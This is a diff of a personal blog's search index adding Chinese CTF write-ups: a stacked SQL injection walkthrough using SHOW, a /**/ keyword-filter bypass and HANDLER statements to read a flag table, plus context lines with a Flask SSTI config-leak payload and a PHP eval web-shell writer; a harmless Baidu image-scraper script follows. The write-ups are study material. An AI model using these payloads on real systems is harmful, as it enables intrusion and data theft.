@@ -721,7 +721,46 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
   <entry>
     <title>NEU</title>
     <url>/2022/12/16/NEU/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>返回了一个数组</p>
+<p>图片1</p>
+<p>再加一个单引号，出现报错，说明存在<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a></p>
+<p>图片2</p>
+<p>为了防止输入1时的干涉，我们输入0（单纯输入0是不会出现任何回应）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;;show databases;#</span><br></pre></td></tr></table></figure>
+
+<p>然后得到数据库的名字</p>
+<p>图片3</p>
+<p> 查询表格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p>图片4</p>
+<p>FlagHere查询这个表格列名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;;show columns from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>图片5</p>
+<p>开始的时候认为直接查询flag就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;;select flag from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>但是此时提示不能出现以下关键词</p>
+<p>图片6</p>
+<p>&#x2F;**&#x2F;可以绕过检查，所以修改payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;;sel/**/ect flag from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>但是竟然什么都没有</p>
+<p>然后查询wp发现还有一种操作</p>
+<blockquote>
+<p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p>
+</blockquote>
+<p>这是一个例子</p>
+<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name <span class="comment">&#123; = | &lt;= | &gt;= | &lt; | &gt; &#125;</span> (value1,value2,...)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name <span class="comment">&#123; FIRST | NEXT | PREV | LAST &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> <span class="comment">&#123; FIRST | NEXT &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
+
+<p> 更多可参考<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">MySQL :: MySQL 8.0 Reference Manual :: 13.2.4 HANDLER Statement</a></p>
+<p>所以按照这个重新构造payload</p>
+<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>&#x27;;<span class="type">HANDLER</span> <span class="type">FlagHere</span> <span class="type">OPEN</span>;<span class="type">HANDLER</span> <span class="type">FlagHere</span> <span class="type">READ</span> <span class="type">FIRST</span>;<span class="type">HANDLER</span> <span class="type">FlagHere</span> <span class="type">CLOSE</span>;#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/e37cf276e28141b294d4230af395ea36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBALeecvOmHjOacieaYn-aysy0=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+]]></content>
   </entry>
   <entry>
     <title>WesternCTF2018 shrine</title>
@@ -746,6 +785,39 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/12/12/kkk/2.jpg" alt="题图"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>爬虫百度</title>
+    <url>/2022/12/14/pachong/</url>
+    <content><![CDATA[<p>network</p>
+<p>for</p>
+<p>range</p>
+<p>先确定用requests库进行请求</p>
+<p>使用re.findall来进行正则匹配</p>
+<p>使用os库来进行保存</p>
+<p>打开<a href="https://image.baidu.com/search">https://image.baidu.com/search</a></p>
+<p>打开network</p>
+<p>观察得到负载中的pn代表着翻页</p>
+<p><img src="/2022/12/14/pachong/1.jpg" alt="题图"></p>
+<p>所以在网址后面加上acjson?再利用parma&#x3D;{}的形式传参</p>
+<p>伪装一下headers</p>
+<p>for一下pn，使用range(start, stop, step)</p>
+<p>for pn in range</p>
+<ul>
+<li>start: 计数从 start 开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</li>
+<li>stop: 计数到 stop 结束，<strong>但不包括 stop</strong>。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</li>
+<li>step：步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</li>
+</ul>
+<p>应该把翻页放在请求之前，可以把翻页设为第一页，且循环中有keyword，所以应该先循环再请求</p>
+<p>再re.findall()中加上re.S可以遍历所有的requests；</p>
+<p>写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(os.path.join(save_dir, f&#x27;&#123;n:06d&#125;.jpg&#x27;), &#x27;wb&#x27;) as fp:</span><br><span class="line">    fp.write(image_data)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_images_from_baidu(page_num, save_dir,keyword):</span><br><span class="line">    header = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36&#x27;&#125;</span><br><span class="line">    # 请求的 url</span><br><span class="line">    url = &#x27;https://image.baidu.com/search/acjson?&#x27;</span><br><span class="line">    n = 0</span><br><span class="line">    for pn in range(0, 30 * page_num, 30):</span><br><span class="line">        # 请求参数 (0, 30 * page_num, 30(步长))</span><br><span class="line">        param = &#123;&#x27;tn&#x27;: &#x27;resultjson_com&#x27;,</span><br><span class="line">                 # &#x27;logid&#x27;: &#x27;7603311155072595725&#x27;,</span><br><span class="line">                 &#x27;ipn&#x27;: &#x27;rj&#x27;,</span><br><span class="line">                 &#x27;ct&#x27;: 201326592,</span><br><span class="line">                 &#x27;is&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;fp&#x27;: &#x27;result&#x27;,</span><br><span class="line">                 &#x27;queryWord&#x27;: keyword,</span><br><span class="line">                 &#x27;cl&#x27;: 2,</span><br><span class="line">                 &#x27;lm&#x27;: -1,</span><br><span class="line">                 &#x27;ie&#x27;: &#x27;utf-8&#x27;,</span><br><span class="line">                 &#x27;oe&#x27;: &#x27;utf-8&#x27;,</span><br><span class="line">                 &#x27;adpicid&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;st&#x27;: -1,</span><br><span class="line">                 &#x27;z&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;ic&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;hd&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;latest&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;copyright&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;word&#x27;: keyword,</span><br><span class="line">                 &#x27;s&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;se&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;tab&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;width&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;height&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;face&#x27;: 0,</span><br><span class="line">                 &#x27;istype&#x27;: 2,</span><br><span class="line">                 &#x27;qc&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;nc&#x27;: &#x27;1&#x27;,</span><br><span class="line">                 &#x27;fr&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;expermode&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;force&#x27;: &#x27;&#x27;,</span><br><span class="line">                 &#x27;cg&#x27;: &#x27;&#x27;,    # 这个参数没公开，但是不可少</span><br><span class="line">                 &#x27;pn&#x27;: pn,    # 显示：30-60-90</span><br><span class="line">                 &#x27;rn&#x27;: &#x27;30&#x27;,  # 每页显示 30 条</span><br><span class="line">                 &#x27;gsm&#x27;: &#x27;96&#x27;,</span><br><span class="line">                 &#x27;1671247792743&#x27;: &#x27;&#x27;</span><br><span class="line">                 &#125;</span><br><span class="line">        request = requests.get(url=url, headers=header, params=param)</span><br><span class="line">        if request.status_code == 200:</span><br><span class="line">            print(&#x27;Request success.&#x27;)</span><br><span class="line">        request.encoding = &#x27;utf-8&#x27;</span><br><span class="line">        # 正则方式提取图片链接</span><br><span class="line">        html = request.text</span><br><span class="line">        image_url_list = re.findall(&#x27;&quot;thumbURL&quot;:&quot;(.*?)&quot;,&#x27;, html, re.S)</span><br><span class="line">        print(image_url_list)</span><br><span class="line"></span><br><span class="line">        if not os.path.exists(save_dir):</span><br><span class="line">            os.makedirs(save_dir)</span><br><span class="line">            #创建文件夹</span><br><span class="line"></span><br><span class="line">        for image_url in image_url_list:</span><br><span class="line">            image_data = requests.get(url=image_url, headers=header).content</span><br><span class="line">            with open(os.path.join(save_dir, f&#x27;&#123;n:06d&#125;.jpg&#x27;), &#x27;wb&#x27;) as fp:</span><br><span class="line">                fp.write(image_data)</span><br><span class="line">            n = n + 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    keyword=&#x27;东北大学&#x27;</span><br><span class="line">    save_dir = keyword</span><br><span class="line">    page_num = 3</span><br><span class="line">    get_images_from_baidu(page_num, save_dir,keyword)</span><br><span class="line">    print(&#x27;Get images finished.&#x27;)</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
 </search>
